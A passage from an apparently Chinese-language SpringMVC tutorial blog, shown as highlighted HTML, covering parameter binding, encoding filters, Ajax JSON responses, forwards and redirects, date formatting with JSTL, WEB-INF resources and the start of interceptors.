class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>action:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/two&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">two</span><span class="params">(Users u)</span>&#123;</span><br><span class="line">    System.out.println(u);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  3)动态占位符提交<br>    仅限于超链接或地址拦提交数据.它是一杠一值,一杠一大括号,使用注解@PathVariable来解析.  </p><p>  &lt;a href&#x3D;”${pageContext.request.contextPath}&#x2F;three&#x2F;张三&#x2F;22.action”&gt;动态提交</a>    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/three/&#123;uname&#125;/&#123;uage&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">three</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="meta">@PathVariable(&quot;uname&quot;)</span>  ===&gt;用来解析路径中的请求参数</span></span><br><span class="line"><span class="params">        String name,</span></span><br><span class="line"><span class="params">        <span class="meta">@PathVariable(&quot;uage&quot;)</span></span></span><br><span class="line"><span class="params">        <span class="type">int</span> age)</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;name=&quot;</span>+name+<span class="string">&quot;,age=&quot;</span>+(age+<span class="number">100</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  4)映射名称不一致<br>    提交请求参数与action方法的形参的名称不一致,使用注解@RequestParam来解析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    *  姓名:&lt;input name=&quot;name&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *  年龄:&lt;input name=&quot;age&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@RequestMapping(&quot;/four&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">four</span><span class="params">(</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;name&quot;)</span>  ===&gt;专门用来解决名称不一致的问题</span></span><br><span class="line"><span class="params">           String uname,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;age&quot;)</span></span></span><br><span class="line"><span class="params">           <span class="type">int</span> uage)</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;uname=&quot;</span>+uname+<span class="string">&quot;,uage=&quot;</span>+(uage+<span class="number">100</span>));</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>  5)手工提取数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  姓名:&lt;input name=&quot;name&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="comment">     *  年龄:&lt;input name=&quot;age&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  <span class="meta">@RequestMapping(&quot;/five&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">five</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> Integer.parseInt(request.getParameter(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;name=&quot;</span>+name+<span class="string">&quot;,age=&quot;</span>+(age+<span class="number">100</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">    &#125;   </span><br></pre></td></tr></table></figure><h3 id="中文乱码解决方案"><a href="#中文乱码解决方案" class="headerlink" title="中文乱码解决方案"></a>中文乱码解决方案</h3><p>  配置过滤器.在web.xml文件中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encode<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">         配置参数</span></span><br><span class="line"><span class="comment">           private String encoding;</span></span><br><span class="line"><span class="comment">           private boolean forceRequestEncoding;</span></span><br><span class="line"><span class="comment">           private boolean forceResponseEncoding;</span></span><br><span class="line"><span class="comment">       --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceRequestEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceResponseEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encode<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="action方法的返回值"><a href="#action方法的返回值" class="headerlink" title="action方法的返回值"></a>action方法的返回值</h3><p>  1)String:客户端资源的地址,自动拼接前缀和后缀.还可以屏蔽自动拼接字符串,可以指定返回的路径.<br>  2)Object:返回json格式的对象.自动将对象或集合转为json.使用的jackson工具进行转换,必须要添加jackson依赖.一般用于ajax请求.<br>  3)void:无返回值,一般用于ajax请求.<br>  4)基本数据类型,用于ajax请求.<br>  5)ModelAndView:返回数据和视图对象,现在用的很少.</p><p><strong>完成ajax请求访问服务器,返回学生集合</strong><br>  1)添加jackson依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  2)在webapp目录下新建js目录,添加jQuery函数库<br>  3)在index.jsp页面上导入函数库</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">url:<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/ajax.action&quot;</span>,</span><br><span class="line">            dataType:<span class="string">&quot;json&quot;</span>,</span><br><span class="line">            type:<span class="string">&quot;get&quot;</span>,</span><br><span class="line">            success:function (list) &#123;</span><br><span class="line">              <span class="comment">//  alert(list);</span></span><br><span class="line">                <span class="keyword">var</span> s=<span class="string">&quot;&quot;</span>;</span><br><span class="line">                $.each(list,function (i,stu) &#123;</span><br><span class="line">                  <span class="comment">//  alert(stu);</span></span><br><span class="line">                    s+=stu.name+<span class="string">&quot;----&quot;</span>+stu.age+<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                &#125;);</span><br><span class="line">                $(<span class="string">&quot;#mydiv&quot;</span>).html(s);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>  4)在action上添加注解@ResponseBody,用来处理ajax请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AjaxAction</span> &#123;</span><br><span class="line">    <span class="comment">//处理ajax请求,一定要加@ResponseBody</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/ajax&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">ajax</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;张三&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;李四&quot;</span>,<span class="number">24</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;王五&quot;</span>,<span class="number">23</span>);</span><br><span class="line">       List&lt;Student&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">       list.add(stu1);</span><br><span class="line">       list.add(stu2);</span><br><span class="line">       list.add(stu3);</span><br><span class="line">        <span class="comment">//调用json转换工具ObjectMapper进行转换</span></span><br><span class="line">        <span class="keyword">return</span> list;  <span class="comment">//===&gt;springmvc负责转换成json</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  5)在springmvc.xml文件中添加注解驱动&lt;mvc:annotationdriven&#x2F;&gt;,它用来解析@ResponseBody注解<br>  &lt;mvc:annotation-driven&gt;</mvc:annotation-driven></p><h3 id="四种跳转方式"><a href="#四种跳转方式" class="headerlink" title="四种跳转方式"></a>四种跳转方式</h3><p>  本质还是两种跳转:请求转发和重定向,衍生出四种是请求转发页面,转发action,重定向页面,重定向action</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/one&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">one</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是请求转发页面跳转.........&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;  <span class="comment">//默认是请求转发,使用视图解析器拼接前缀后缀进行页面跳转</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/two&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">two</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是请求转发action跳转.........&quot;</span>);</span><br><span class="line">        <span class="comment">//  /admin/  /other.action  .jsp</span></span><br><span class="line">        <span class="comment">//forward: 这组字符串可以屏蔽前缀和后缀的拼接.实现请求转发跳转</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;forward:/other.action&quot;</span>;  <span class="comment">//默认是请求转发,使用视图解析器拼接前缀后缀进行页面跳转</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/three&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">three</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是重定向页面.......&quot;</span>);</span><br><span class="line">        <span class="comment">//redirect:  这组字符串可以屏蔽前缀和后缀的拼接.实现重定向跳转</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/admin/main.jsp&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/four&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">four</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是重定向action.......&quot;</span>);</span><br><span class="line">        <span class="comment">//redirect:  这组字符串可以屏蔽前缀和后缀的拼接.实现重定向跳转</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/other.action&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/five&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">five</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是随便跳.......&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;forward:/fore/login.jsp&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="SpringMVC默认的参数类型"><a href="#SpringMVC默认的参数类型" class="headerlink" title="SpringMVC默认的参数类型"></a>SpringMVC默认的参数类型</h3><p>  不需要去创建,直接拿来使用即可.<br>  1)HttpServletRequest<br>  2)HttpServletResponse<br>  3)HttpSession<br>  4)Model<br>  5)Map<br>  6)ModelMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//做一个数据,传到main.jsp页面上</span></span><br><span class="line">        <span class="type">Users</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Users</span>(<span class="string">&quot;张三&quot;</span>,<span class="number">22</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//传递数据</span></span><br><span class="line">        request.setAttribute(<span class="string">&quot;requestUsers&quot;</span>,u);</span><br><span class="line">        session.setAttribute(<span class="string">&quot;sessionUsers&quot;</span>,u);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;modelUsers&quot;</span>,u);</span><br><span class="line">        map.put(<span class="string">&quot;mapUsers&quot;</span>,u);</span><br><span class="line">        modelMap.addAttribute(<span class="string">&quot;modelMapUsers&quot;</span>,u);</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">  注意:Map,Model,ModelMap和request一样,都使用请求作用域进行数据传递.所以服务器端的跳转必须是请求转发.</span><br><span class="line"></span><br><span class="line">### 日期处理</span><br><span class="line">  <span class="number">1</span>)日期的提交处理</span><br><span class="line">    A.单个日期处理</span><br><span class="line">    要使用注解<span class="meta">@DateTimeFormat</span>,此注解必须搭配springmvc.xml文件中的\&lt;mvc:annotationdriven标签&gt;</span><br><span class="line">    B.类中全局日期处理</span><br><span class="line">    注册一个注解,用来解析本类中所有的日期类型,自动转换.</span><br><span class="line">```java</span><br><span class="line">     <span class="meta">@InitBinder</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initBinder</span><span class="params">(WebDataBinder dataBinder)</span>&#123;</span><br><span class="line">        dataBinder.registerCustomEditor(Date.class,<span class="keyword">new</span> <span class="title class_">CustomDateEditor</span>(sf,<span class="literal">true</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>  2)日期的显示处理<br>    在页面上显示好看的日期,必须使用JSTL.<br>    步骤:<br>    A)添加依赖jstl</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   B)在页面上导入标签库<br>    如果是单个日期对象,直接转为好看的格式化的字符串进行显示.<br>    如果是list中的实体类对象的成员变量是日期类型,则必须使用jstl进行显示.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   &lt;%--导入jstl核心标签库--%&gt;</span><br><span class="line">&lt;%@taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;</span><br><span class="line">&lt;%--导入jstl格式化标签库--%&gt;</span><br><span class="line">&lt;%@taglib prefix=&quot;fmt&quot; uri=&quot;http://java.sun.com/jsp/jstl/fmt&quot; %&gt;</span><br></pre></td></tr></table></figure><p>C)使用标签显示数据    </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">&quot;800px&quot;</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">th</span>&gt;</span>生日<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">&quot;$&#123;list&#125;&quot;</span> <span class="attr">var</span>=<span class="string">&quot;stu&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">td</span>&gt;</span>$&#123;stu.name&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">td</span>&gt;</span>$&#123;stu.birthday&#125;------ <span class="tag">&lt;<span class="name">fmt:formatDate</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;stu.birthday&#125;&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;yyyy-MM-dd&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">fmt:formatDate</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="资源在WEB-INF目录下"><a href="#资源在WEB-INF目录下" class="headerlink" title="资源在WEB-INF目录下"></a>资源在WEB-INF目录下</h3><p>  此目录下的动态资源,不可直接访问,只能通过请求转发的方式进行访问 .</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebInfAction</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/showIndex&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">showIndex</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;访问index.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/showMain&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">showMain</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;访问main.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/showLogin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">showLogin</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;访问login.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//登录的业务判断</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">login</span><span class="params">(String name, String pwd, HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;zar&quot;</span>.equalsIgnoreCase(name) &amp;&amp; <span class="string">&quot;123&quot;</span>.equalsIgnoreCase(pwd))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;用户名或密码不正确!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SpringMVC的拦截器"><a href="#SpringMVC的拦截器" class="headerlink" title="SpringMVC的拦截器"></a>SpringMVC的拦截器</h2><p>  针对请求和响应进行的额外的处理.在请求和响应的过程中添加预处理,后处理和最终处理.</p><h3 id="拦截器执行的时机"><a href="#拦截器执行的时机" class="headerlink" title="拦截器执行的时机"></a>拦截器执行的时机</h3><p>  1)preHandle():在请求被处理之前进行操作,预处理<br>  2)postHandle():在请求被处理之后,但结果还没有渲染前进行操作,可以改变响应结果,后处理<br>  3)afterCompletion:所有的请求响应结束后执行善后工作,清理对象,关闭资源 ,最终处理.</p><h3 id="拦截器实现的两种方式"><a href="#拦截器实现的两种方式" class="headerlink" title="拦截器实现的两种方式"></a>拦截器实现的两种方式</h3><p>  1)继承HandlerInterceptorAdapter的父类<br>  2)实现HandlerInterceptor接口,实现的接口,推荐使用实现接口的方式</p><h3 id="拦截器实现的步骤"><a href="#拦截器实现的步骤" class="headerlink" title="拦截器实现的步骤"></a>拦截器实现的步骤</h3><p>  1)改造登录方法,在session中存储用户信息,用于进行权限验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">login</span><span class="params">(String name, String pwd, HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;zar&quot;</span>.equalsIgnoreCase(name) &amp;&amp; <span class="string">&quot;123&quot;</span>.equalsIgnoreCase(pwd))&#123;</span><br><span class="line">            <span class="comment">//在session中存储用户信息,用于进行权限验证</span></span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;users&quot;</span>,name);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">        &#125;<span 